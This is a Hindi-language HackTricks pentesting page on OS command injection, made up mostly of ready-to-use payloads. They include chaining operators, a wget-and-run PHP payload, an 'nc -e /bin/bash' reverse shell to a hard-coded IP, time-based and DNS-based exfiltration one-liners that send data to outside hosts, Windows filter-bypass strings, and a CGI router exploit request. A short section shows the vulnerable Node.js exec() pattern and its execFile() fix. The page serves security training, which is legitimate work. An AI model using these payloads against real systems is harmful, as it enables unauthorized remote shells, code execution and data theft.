# Command Injection

{{#include ../banners/hacktricks-training.md}}

## command Injection क्या है?

एक **command injection** आक्रमणकर्ता को उस server पर arbitrary operating system commands निष्पादित करने की अनुमति देती है जो किसी application की होस्टिंग कर रहा होता है। परिणामस्वरूप, application और उसके सभी data पूरी तरह से compromised हो सकते हैं। इन commands के निष्पादन से आम तौर पर attacker को application के environment और underlying system पर unauthorized access या control प्राप्त हो सकता है।

### संदर्भ

यह निर्भर करता है कि **आपका input कहाँ inject किया जा रहा है** — आपको commands से पहले **quoted context** को **terminate** (using `"` or `'`) करने की आवश्यकता हो सकती है।

## Command Injection/Execution
```bash
#Both Unix and Windows supported
ls||id; ls ||id; ls|| id; ls || id # Execute both
ls|id; ls |id; ls| id; ls | id # Execute both (using a pipe)
ls&&id; ls &&id; ls&& id; ls && id #  Execute 2º if 1º finish ok
ls&id; ls &id; ls& id; ls & id # Execute both but you can only see the output of the 2º
ls %0A id # %0A Execute both (RECOMMENDED)
ls%0abash%09-c%09"id"%0a   # (Combining new lines and tabs)

#Only unix supported
`ls` # ``
$(ls) # $()
ls; id # ; Chain commands
ls${LS_COLORS:10:1}${IFS}id # Might be useful

#Not executed but may be interesting
> /var/www/html/out.txt #Try to redirect the output to a file
< /etc/passwd #Try to send some input to the command
```
### **सीमाएँ** Bypasses

यदि आप **arbitrary commands inside a linux machine** निष्पादित करने का प्रयास कर रहे हैं, तो आप इस **Bypasses:** के बारे में पढ़ने में रुचि रखेंगे।


{{#ref}}
../linux-hardening/bypass-bash-restrictions/
{{#endref}}

### **उदाहरण**
```
vuln=127.0.0.1 %0a wget https://web.es/reverse.txt -O /tmp/reverse.php %0a php /tmp/reverse.php
vuln=127.0.0.1%0anohup nc -e /bin/bash 51.15.192.49 80
vuln=echo PAYLOAD > /tmp/pay.txt; cat /tmp/pay.txt | base64 -d > /tmp/pay; chmod 744 /tmp/pay; /tmp/pay
```
### पैरामीटर

यहाँ शीर्ष 25 पैरामीटर दिए गए हैं जो code injection और समान RCE कमजोरियों के प्रति संवेदनशील हो सकते हैं (स्रोत: [link](https://twitter.com/trbughunters/status/1283133356922884096)):
```
?cmd={payload}
?exec={payload}
?command={payload}
?execute{payload}
?ping={payload}
?query={payload}
?jump={payload}
?code={payload}
?reg={payload}
?do={payload}
?func={payload}
?arg={payload}
?option={payload}
?load={payload}
?process={payload}
?step={payload}
?read={payload}
?function={payload}
?req={payload}
?feature={payload}
?exe={payload}
?module={payload}
?payload={payload}
?run={payload}
?print={payload}
```
### Time based data exfiltration

डेटा निकालना: अक्षर-दर-अक्षर
```
swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
real    0m5.007s
user    0m0.000s
sys 0m0.000s

swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
real    0m0.002s
user    0m0.000s
sys 0m0.000s
```
### DNS आधारित data exfiltration

यह `https://github.com/HoLyVieR/dnsbin` टूल पर आधारित है, और dnsbin.zhack.ca पर भी होस्ट किया गया है
```
1. Go to http://dnsbin.zhack.ca/
2. Execute a simple 'ls'
for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
```

```
$(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').sudo.co.il)
```
DNS आधारित data exfiltration की जांच करने के लिए ऑनलाइन टूल:

- dnsbin.zhack.ca
- pingb.in

### फ़िल्टरिंग बायपास

#### Windows
```
powershell C:**2\n??e*d.*? # notepad
@^p^o^w^e^r^shell c:**32\c*?c.e?e # calc
```
#### Linux


{{#ref}}
../linux-hardening/bypass-bash-restrictions/
{{#endref}}

### Node.js `child_process.exec` vs `execFile`

JavaScript/TypeScript बैक-एंड्स का ऑडिट करते समय आप अक्सर Node.js `child_process` API का सामना करेंगे।
```javascript
// Vulnerable: user-controlled variables interpolated inside a template string
const { exec } = require('child_process');
exec(`/usr/bin/do-something --id_user ${id_user} --payload '${JSON.stringify(payload)}'`, (err, stdout) => {
/* … */
});
```
`exec()` एक **shell** (`/bin/sh -c`) को spawn करता है, इसलिए shell के लिए विशेष अर्थ रखने वाला कोई भी कैरेक्टर (back-ticks, `;`, `&&`, `|`, `$()`, …) तब **command injection** का कारण बनेगा जब user input स्ट्रिंग में concatenated किया जाएगा।

**निवारण:** `execFile()` का उपयोग करें (या `spawn()` बिना `shell` option के) और **प्रत्येक argument को एक अलग array element के रूप में प्रदान करें** ताकि कोई shell शामिल न हो:
```javascript
const { execFile } = require('child_process');
execFile('/usr/bin/do-something', [
'--id_user', id_user,
'--payload', JSON.stringify(payload)
]);
```
वास्तविक मामला: *Synology Photos* ≤ 1.7.0-0794 एक प्रमाणीकरण-रहित WebSocket event के माध्यम से exploitable था जिसने attacker-controlled डेटा को `id_user` में रख दिया, जो बाद में `exec()` कॉल में एम्बेड होकर RCE हासिल कर गया (Pwn2Own Ireland 2024)।

### Argument/Option injection via leading hyphen (argv, no shell metacharacters)

सभी injections को shell metacharacters की आवश्यकता नहीं होती। यदि एप्लिकेशन untrusted स्ट्रिंग्स को system utility के arguments के रूप में पास करता है (यहां तक कि `execve`/`execFile` के साथ और बिना shell के), तो कई प्रोग्राम किसी भी argument को जो `-` या `--` से शुरू होता है, option के रूप में पार्स कर लेंगे। इससे attacker मोड बदल सकते हैं, output paths बदल सकते हैं, या shell में घुसे बिना ही खतरनाक व्यवहार ट्रिगर कर सकते हैं।

आम जगहें जहाँ यह दिखता है:

- Embedded web UIs/CGI handlers जो ऐसे commands बनाते हैं जैसे `ping <user>`, `tcpdump -i <iface> -w <file>`, `curl <url>`, आदि।
- Centralized CGI routers (e.g., `/cgi-bin/<something>.cgi` with a selector parameter like `topicurl=<handler>`) जहाँ कई handlers एक ही कमजोर validator को reuse करते हैं।

क्या आज़माएँ:

- ऐसे मान दें जो `-`/`--` से शुरू हों ताकि downstream tool द्वारा flags की तरह consume किए जाएँ।
- उन flags का दुरुपयोग करें जो व्यवहार बदलते हैं या फ़ाइलें लिखते हैं, उदाहरण के लिए:
  - `ping`: `-f`/`-c 100000` डिवाइस पर दबाव डालने के लिए (DoS)
  - `curl`: `-o /tmp/x` arbitrary paths पर लिखने के लिए, `-K <url>` हमलावर-नियंत्रित config लोड करने के लिए
  - `tcpdump`: `-G 1 -W 1 -z /path/script.sh` unsafe wrappers में post-rotate execution हासिल करने के लिए
- यदि प्रोग्राम `--` end-of-options को सपोर्ट करता है, तो उन naive mitigations को बायपास करने की कोशिश करें जो गलत जगह पर `--` prepend करते हैं।

Generic PoC shapes against centralized CGI dispatchers:
```
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Content-Type: application/x-www-form-urlencoded

# Flip options in a downstream tool via argv injection
topicurl=<handler>&param=-n

# Unauthenticated RCE when a handler concatenates into a shell
topicurl=setEasyMeshAgentCfg&agentName=;id;
```
## Brute-Force डिटेक्शन सूची


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/command_injection.txt
{{#endref}}


## संदर्भ

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [https://portswigger.net/web-security/os-command-injection](https://portswigger.net/web-security/os-command-injection)
- [Synology एन्क्रिप्टेड आर्काइव्स का निष्कर्षण – Synacktiv 2025](https://www.synacktiv.com/publications/extraction-des-archives-chiffrees-synology-pwn2own-irlande-2024.html)
- [PHP proc_open मैनुअल](https://www.php.net/manual/en/function.proc-open.php)
- [HTB Nocturnal: IDOR → Command Injection → Root via ISPConfig (CVE‑2023‑46818)](https://0xdf.gitlab.io/2025/08/16/htb-nocturnal.html)
- [Unit 42 – TOTOLINK X6000R: तीन नई Vulnerabilities का खुलासा](https://unit42.paloaltonetworks.com/totolink-x6000r-vulnerabilities/)

{{#include ../banners/hacktricks-training.md}}
